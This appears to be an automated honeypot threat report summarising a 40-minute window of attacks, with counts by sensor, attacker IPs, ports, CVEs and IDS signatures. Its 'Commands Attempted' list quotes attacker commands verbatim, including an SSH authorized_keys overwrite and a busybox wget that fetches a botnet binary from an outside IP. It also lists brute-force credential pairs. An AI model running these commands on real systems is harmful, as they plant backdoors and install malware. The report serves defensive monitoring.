
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-17T15:01:43Z
**Timeframe:** 2025-10-17T14:20:01Z to 2025-10-17T15:00:01Z
**Files Used:**
- agg_log_20251017T142001Z.json
- agg_log_20251017T144001Z.json
- agg_log_20251017T150001Z.json

## Executive Summary

This report summarizes 18,178 attacks recorded by our honeypot network over a 40-minute period. The majority of attacks were SSH brute-force attempts, followed by scanning for vulnerabilities in SMB and other services. The most active attacker IP was 91.243.198.11. A significant number of attackers attempted to download and execute malicious scripts.

## Detailed Analysis

### Attacks by Honeypot

- Cowrie: 7341
- Honeytrap: 3264
- Suricata: 2823
- Dionaea: 1569
- Ciscoasa: 1413
- Sentrypeer: 1157
- Redishoneypot: 105
- Adbhoney: 48
- H0neytr4p: 106
- Tanner: 178
- Heralding: 53
- Mailoney: 76
- ConPot: 5
- Honeyaml: 4
- ElasticPot: 1
- Ipphoney: 5

### Top Attacking IPs

- 91.243.198.11
- 200.58.166.84
- 72.146.232.13
- 103.1.236.115
- 45.140.17.52

### Top Targeted Ports/Protocols

- 445
- TCP/445
- 22
- 5060
- 80

### Most Common CVEs

- CVE-2021-3449
- CVE-2019-11500
- CVE-2001-0414
- CVE-2021-35394
- CVE-2002-1149
- CVE-2006-3602
- CVE-2006-4458
- CVE-2006-4542
- CVE-2002-0013
- CVE-2002-0012

### Commands Attempted by Attackers

- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa ...\" >> .ssh/authorized_keys`
- `cat /proc/cpuinfo | grep name | wc -l`
- `uname -a`
- `whoami`
- `Enter new UNIX password:`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

### Signatures Triggered

- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET INFO VNC Authentication Failure
- ET SCAN MS Terminal Server Traffic on Non-standard Port

### Users / Login Attempts

- root/
- 345gs5662d34/345gs5662d34
- test/test2002
- operator/operator444
- guest/7

### Files Uploaded/Downloaded

- arm.urbotnetisass
- ohsitsvegawellrip.sh
- gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png
- discovery

### HTTP User-Agents

- No data available.

### SSH Clients

- No data available.

### SSH Servers

- No data available.

### Top Attacker AS Organizations

- No data available.

## Key Observations and Anomalies

- A high volume of attacks originated from a single IP address (91.243.198.11), primarily targeting SMB.
- A significant number of attackers attempted to download and execute malware, particularly the 'urbotnetisass' payload.
- Brute-force attacks on SSH remain a common tactic, with a wide variety of usernames and passwords being tested.
